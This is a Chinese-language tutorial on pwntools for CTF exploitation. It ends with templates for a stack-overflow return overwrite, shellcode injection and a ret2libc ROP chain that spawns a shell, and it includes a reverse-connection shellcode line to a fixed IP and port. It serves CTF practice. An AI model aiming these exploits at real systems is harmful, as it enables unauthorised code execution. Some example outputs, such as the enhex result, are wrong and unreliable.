# pwntools 基础使用指南

## 什么是 pwntools

pwntools 是一个 Python 库，为 CTF 和漏洞利用开发提供了大量便利功能。它是最流行的 pwn 工具框架。

安装：
```bash
pip install pwntools
```

## 基础导入

```python
from pwn import *

# 设置上下文（重要！）
context.arch = 'amd64'      # 或 'i386'
context.os = 'linux'
context.log_level = 'debug' # 'debug', 'info', 'warn', 'error'
```

## 进程交互

### 启动本地进程

```python
# 基本启动
p = process('./vuln')

# 带参数启动
p = process(['./vuln', 'arg1', 'arg2'])

# 带环境变量
p = process('./vuln', env={'KEY': 'value'})

# 启动并附加 GDB
p = gdb.debug('./vuln', '''
    break main
    continue
''')
```

### 连接远程

```python
# 连接远程服务
p = remote('pwn.college', 1337)

# SSH 连接
s = ssh('user', 'host', password='pass')
p = s.process('./vuln')
```

### 发送和接收数据

```python
# 发送数据
p.send(b'data')                # 发送数据（不换行）
p.sendline(b'data')            # 发送数据（加换行）
p.sendafter(b'prompt', b'data')# 等待提示后发送

# 接收数据
data = p.recv(100)             # 接收100字节
data = p.recvline()            # 接收一行
data = p.recvuntil(b'flag')    # 接收直到遇到'flag'
data = p.recvall()             # 接收所有数据（直到EOF）

# 交互模式
p.interactive()                # 进入交互模式（手动输入）

# 清理
p.close()                      # 关闭连接
```

## 数据打包和解包

### 整数打包

```python
# 打包成字节（小端序）
p32(0x12345678)     # → b'\x78\x56\x34\x12' (32位)
p64(0x1234567890)   # → 8字节 (64位)

# 大端序
p32(0x12345678, endian='big')  # → b'\x12\x34\x56\x78'

# 解包
u32(b'\x78\x56\x34\x12')       # → 0x12345678
u64(b'\x00'*8)                 # → 0
```

### 字符串处理

```python
# 字节和字符串
b = b'hello'                   # 字节串
s = 'hello'                    # 字符串

# 十六进制
enhex(b'flag')                 # → 'f6c6167'
unhex('666c6167')              # → b'flag'
```

## Cyclic 模式（查找偏移）

```python
# 生成 cyclic 模式
pattern = cyclic(100)          # 生成100字节模式
print(pattern)                 # b'aaaabaaacaaadaaa...'

# 发送模式
p.sendline(pattern)

# 程序崩溃后，假设 RIP = 0x6161616161616162
offset = cyclic_find(0x6161616161616162)  # 找到偏移量
print(f'Offset: {offset}')
```

## Shellcode 生成

```python
# 设置架构
context.arch = 'amd64'

# 使用 shellcraft 生成 shellcode
shellcode = asm(shellcraft.sh())           # 执行 /bin/sh
shellcode = asm(shellcraft.cat('/flag'))   # 读取文件
shellcode = asm(shellcraft.connect('192.168.1.1', 4444))  # 反向连接

# 自定义汇编
shellcode = asm('''
    mov rax, 59
    lea rdi, [rip+binsh]
    xor rsi, rsi
    xor rdx, rdx
    syscall
    binsh:
        .string "/bin/sh"
''')

# 反汇编
code = b'\x48\x31\xc0'
print(disasm(code))
```

## ELF 文件操作

```python
# 加载 ELF 文件
elf = ELF('./vuln')

# 查看信息
print(hex(elf.address))        # 基地址
print(hex(elf.entry))          # 入口点
print(elf.checksec())          # 保护机制

# 查找符号
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

# 查找字符串
binsh = next(elf.search(b'/bin/sh'))

# 查找 ROP gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
```

## ROP 工具

```python
elf = ELF('./vuln')
rop = ROP(elf)

# 自动构造 ROP 链
rop.call('puts', [elf.got['puts']])
rop.call('main')

# 手动构造
rop.raw(pop_rdi)
rop.raw(elf.got['puts'])
rop.raw(elf.plt['puts'])

# 获取 ROP 链
payload = rop.chain()
print(rop.dump())              # 打印 ROP 链
```

## 实用工具

### 日志

```python
log.info('This is info')
log.success('Exploit successful!')
log.warning('Warning message')
log.error('Error occurred')
log.debug('Debug info')

# 进度条
p = log.progress('Exploiting')
p.status('Sending payload...')
p.success('Done!')
```

### 编码

```python
# Base64
b64e(b'data')                  # 编码
b64d('ZGF0YQ==')               # 解码

# URL
urlencode('hello world')       # → 'hello%20world'
urldecode('hello%20world')     # → 'hello world'
```

### 数学

```python
# 对齐
align(0x12, 0x10)              # → 0x10（向下对齐）
align_up(0x12, 0x10)           # → 0x20（向上对齐）
```

## 常用模板

### 基础栈溢出利用

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# 启动程序
p = process('./vuln')
# p = remote('host', port)

# 获取 ELF 信息
elf = ELF('./vuln')

# 找偏移量
# 方法1：用 cyclic
p.sendline(cyclic(100))
# 崩溃后记录地址，然后：
# offset = cyclic_find(crash_addr)

# 方法2：直接计算
offset = 72

# 构造 payload
target = 0x401234  # 目标地址
payload = b'A' * offset + p64(target)

# 发送 payload
p.sendline(payload)

# 交互
p.interactive()
```

### Shellcode 注入

```python
from pwn import *

context.arch = 'amd64'
p = process('./vuln')

# 生成 shellcode
shellcode = asm(shellcraft.sh())

# 获取缓冲区地址（可能需要通过 GDB）
# 或者通过信息泄露获取
buf_addr = 0x7fffffffde00

# 构造 payload
offset = 72
payload = shellcode + b'A' * (offset - len(shellcode)) + p64(buf_addr)

p.sendline(payload)
p.interactive()
```

### ROP 链

```python
from pwn import *

context.arch = 'amd64'
p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# 泄露 libc 地址
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['main'])

p.sendline(payload1)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

# 获取 shell
binsh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
payload2 = b'A' * offset
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)

p.sendline(payload2)
p.interactive()
```

## 常见技巧

### 处理缓冲问题

```python
# 有时程序有缓冲，需要强制刷新
p.sendline(payload)
p.flush()  # 或在 sendline 后立即 recv
```

### 处理超时

```python
# 设置超时
p.recvuntil(b'prompt', timeout=2)

# 清空缓冲区
p.clean()
```

### 多次利用

```python
# 使用 context manager
with process('./vuln') as p:
    p.sendline(payload)
    flag = p.recvline()
    print(flag)
# 自动关闭连接
```

## 总结

pwntools 核心功能：
1. **进程交互**：`process()`, `remote()`, `send()`, `recv()`
2. **数据打包**：`p32()`, `p64()`, `u32()`, `u64()`
3. **Cyclic 模式**：`cyclic()`, `cyclic_find()`
4. **Shellcode**：`asm()`, `shellcraft`
5. **ELF 操作**：`ELF()`, `symbols`, `plt`, `got`
6. **ROP 工具**：`ROP()`, `find_gadget()`

掌握这些，pwn 题会事半功倍！
